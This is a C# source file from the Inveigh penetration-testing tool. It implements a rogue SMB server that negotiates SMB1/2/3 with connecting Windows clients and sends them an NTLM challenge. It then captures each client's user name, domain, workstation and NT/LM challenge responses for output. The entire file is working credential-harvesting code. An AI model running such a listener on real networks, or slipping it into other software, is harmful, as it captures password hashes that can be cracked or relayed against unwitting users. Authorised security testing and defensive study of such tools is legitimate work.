/*
 * BSD 3-Clause License
 *
 * Copyright (c) 2021, Kevin Robertson
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 * 
 * 1. Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its
 * contributors may be used to endorse or promote products derived from
 * this software without specific prior written permission. 
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Quiddity;
using Quiddity.NetBIOS;
using Quiddity.NTLM;
using Quiddity.SMB;
using Quiddity.SMB2;
using Quiddity.Support;

namespace Inveigh
{
    class SMBListener
    {
        internal void Start(IPAddress ipAddress, int port)
        {
            TCPListener tcpListener = new TCPListener(ipAddress, port);
            IAsyncResult tcpAsync;
            TcpClient tcpClient;
            Guid guid = Guid.NewGuid();

            try
            {
                tcpListener.Start();
            }
            catch (Exception ex)
            {

                if (ex.Message.ToString().Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
                {
                    Output.Queue(String.Format("[!] Failed to start SMB listener on port {0}, check IP and port usage.", port));
                }
                else
                {
                    Output.Queue(ex.ToString());
                }

                Program.enabledSMB = false;
            }

            while (Program.isRunning && Program.enabledSMB)
            {
                tcpAsync = tcpListener.BeginAcceptTcpClient(null, null);

                do
                {
                    Thread.Sleep(10);

                    if (!Program.isRunning)
                    {
                        break;
                    }

                }
                while (!tcpAsync.IsCompleted);

                tcpClient = tcpListener.EndAcceptTcpClient(tcpAsync);
                object[] parameters = { guid, tcpClient };
                ThreadPool.QueueUserWorkItem(new WaitCallback(ReceiveClient), parameters);
            }

        }

        internal void ReceiveClient(object parameters)
        {
            object[] parameterArray = parameters as object[];
            Guid serverGuid = (Guid)parameterArray[0];
            TcpClient tcpClient = (TcpClient)parameterArray[1];
            NetworkStream tcpStream = tcpClient.GetStream();
            bool isSMB2;
            string challenge = "";
            string clientIP = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Address.ToString();
            string clientPort = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Port.ToString();
            string listenerPort = ((IPEndPoint)(tcpClient.Client.LocalEndPoint)).Port.ToString();

            while (tcpClient.Connected && Program.isRunning)
            {
                byte[] requestData = new byte[4096];

                do
                {
                    Thread.Sleep(100);
                }
                while (!tcpStream.DataAvailable && tcpClient.Connected);

                while (tcpStream.DataAvailable)
                {
                    tcpStream.Read(requestData, 0, requestData.Length);
                }

                NetBIOSSessionService requestNetBIOSSessionService = new NetBIOSSessionService(requestData);
                SMBHelper smbHelper = new SMBHelper();

                if (requestNetBIOSSessionService.Type == 0 || smbHelper.Protocol[0] == 0xfe || smbHelper.Protocol[0] == 0xff)
                {
                    int sessionServiceIndex = 0;

                    if (requestNetBIOSSessionService.Type == 0)
                    {
                        sessionServiceIndex = 4;
                    }

                    byte[] sendBuffer = new byte[0];                   
                    SMBHeader requestSMBHeader = new SMBHeader();
                    SMB2Header requestSMB2Header = new SMB2Header();
                    smbHelper.ReadBytes(requestData, sessionServiceIndex);

                    if (smbHelper.Protocol[0] == 0xfe)
                    {
                        isSMB2 = true;
                        requestSMB2Header.ReadBytes(requestData, sessionServiceIndex);
                    }
                    else
                    {
                        isSMB2 = false;
                        requestSMBHeader.ReadBytes(requestData, sessionServiceIndex);
                    }

                    if (!isSMB2 && requestSMBHeader.Command == 0x72 || (isSMB2 && requestSMB2Header.Command == 0))
                    {
                        SMB2NegotiatelRequest smb2NegotiatelRequest = new SMB2NegotiatelRequest(requestData, 64 + sessionServiceIndex);
                        SMB2Header responseSMB2Header = new SMB2Header();
                        SMB2NegotiateResponse smb2NegotiateResponse = new SMB2NegotiateResponse();

                        if (!isSMB2)
                        {
                            smb2NegotiateResponse.DialectRivision = new byte[2] { 0xff, 0x02 };
                            smb2NegotiateResponse.Capabilities = new byte[4] { 0x07, 0x00, 0x00, 0x00 };
                            Output.Queue(String.Format("[.] [{0}] SMB1({1}) negotiation request received from {2}:{3}", Output.Timestamp(), listenerPort, clientIP, clientPort));
                        }
                        else if (isSMB2)
                        {
                            responseSMB2Header.MessageId = requestSMB2Header.MessageId;

                            if (smb2NegotiatelRequest.GetMaxDialect() == 0x311)
                            {
                                smb2NegotiateResponse.DialectRivision = new byte[2] { 0x11, 0x03 };
                                smb2NegotiateResponse.NegotiateContextCount = 3;
                                smb2NegotiateResponse.Capabilities = new byte[4] { 0x2f, 0x00, 0x00, 0x00 };
                                smb2NegotiateResponse.NegotiateContextOffset = 448;
                                smb2NegotiateResponse.NegotiateContextList = new SMB2NegotiateContext().GetBytes(new string[] { "1", "2", "3" });
                                Output.Queue(String.Format("[.] [{0}] SMB3({1}) negotiated with {2}:{3}", Output.Timestamp(), listenerPort, clientIP, clientPort));
                            }
                            else
                            {
                                smb2NegotiateResponse.DialectRivision = new byte[2] { 0x10, 0x02 };
                                smb2NegotiateResponse.Capabilities = new byte[4] { 0x07, 0x00, 0x00, 0x00 };
                                Output.Queue(String.Format("[.] [{0}] SMB2({1}) negotiated with {2}:{3}", Output.Timestamp(), listenerPort, clientIP, clientPort));
                            }

                            responseSMB2Header.Reserved2 = requestSMB2Header.Reserved2; // todo fix
                        }

                        smb2NegotiateResponse.EncodeBuffer();
                        smb2NegotiateResponse.ServerGUID = serverGuid.ToByteArray();
                        sendBuffer = SMB2Helper.GetBytes(new NetBIOSSessionService(), responseSMB2Header, smb2NegotiateResponse);
                    }
                    else if (isSMB2 && requestSMB2Header.Command > 0)
                    {

                        switch (requestSMB2Header.Command)
                        {

                            case 1:
                                {
                                    SMB2SessionSetupRequest smb2SessionSetupRequest = new SMB2SessionSetupRequest(requestData, 64 + sessionServiceIndex);
                                    NTLMNegotiate requestNTLMNegotiate = new NTLMNegotiate(smb2SessionSetupRequest.Buffer, true);

                                    if (requestNTLMNegotiate.MessageType == 1)
                                    {
                                        SMB2Header responseSMB2Header = new SMB2Header();
                                        SMB2SessionSetupResponse smb2SessionSetupResponse = new SMB2SessionSetupResponse();
                                        responseSMB2Header.Status = new byte[4] { 0x16, 0x00, 0x00, 0xc0 };
                                        responseSMB2Header.CreditCharge = 1;
                                        responseSMB2Header.Reserved2 = requestSMB2Header.Reserved2;
                                        responseSMB2Header.Command = 1;
                                        responseSMB2Header.Flags = new byte[4] { 0x11, 0x00, 0x00, 0x00 };
                                        responseSMB2Header.MessageId = requestSMB2Header.MessageId;
                                        responseSMB2Header.SessionId = BitConverter.GetBytes(Program.smb2Session);
                                        Program.smb2Session++;
                                        smb2SessionSetupResponse.Pack(Program.argChallenge, Program.netbiosDomain, Program.computerName, Program.dnsDomain, Program.computerName, Program.dnsDomain, out byte[] challengeData);
                                        sendBuffer = SMB2Helper.GetBytes(new NetBIOSSessionService(), responseSMB2Header, smb2SessionSetupResponse);
                                        challenge = BitConverter.ToString(challengeData).Replace("-", "");
                                        Output.Queue(String.Format("[+] [{0}] SMB({1}) NTLM challenge [{2}] sent to {3}:{4}", Output.Timestamp(), listenerPort, challenge, clientIP, clientPort));
                                    }
                                    else if (requestNTLMNegotiate.MessageType == 3)
                                    {
                                        NTLMResponse ntlmResponse = new NTLMResponse(smb2SessionSetupRequest.Buffer, true);
                                        string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
                                        string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
                                        string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
                                        string response = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-","");
                                        string lmResponse = BitConverter.ToString(ntlmResponse.LmChallengeResponse).Replace("-", "");
                                        Output.NTLMOutput(user, domain, challenge, response, clientIP, host, "SMB", listenerPort, clientPort, lmResponse);
                                        SMB2Header responseSMB2Header = new SMB2Header();
                                        SMB2SessionSetupResponse smb2SessionSetupResponse = new SMB2SessionSetupResponse();
                                        responseSMB2Header.Status = new byte[4] { 0x6d, 0x00, 0x00, 0xc0 };
                                        //responseSMB2Header.Status = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
                                        //responseSMB2Header.Status = new byte[4] { 0x22, 0x00, 0x00, 0xc0 }; //access denied
                                        responseSMB2Header.CreditCharge = 1;
                                        responseSMB2Header.Reserved2 = requestSMB2Header.Reserved2;
                                        responseSMB2Header.Command = 1;
                                        responseSMB2Header.Flags = new byte[4] { 0x11, 0x00, 0x00, 0x00 };
                                        responseSMB2Header.MessageId = requestSMB2Header.MessageId;
                                        responseSMB2Header.SessionId = requestSMB2Header.SessionId;
                                        smb2SessionSetupResponse.SecurityBufferOffset = 0;
                                        sendBuffer = SMB2Helper.GetBytes(new NetBIOSSessionService(), responseSMB2Header, smb2SessionSetupResponse);
                                    }

                                }
                                break;

                        }                   

                    }

                    tcpStream.Write(sendBuffer, 0, sendBuffer.Length);
                    tcpStream.Flush();
                }
                else
                {
                    // tcpClient.Close();
                }

            }

        }

    }

}
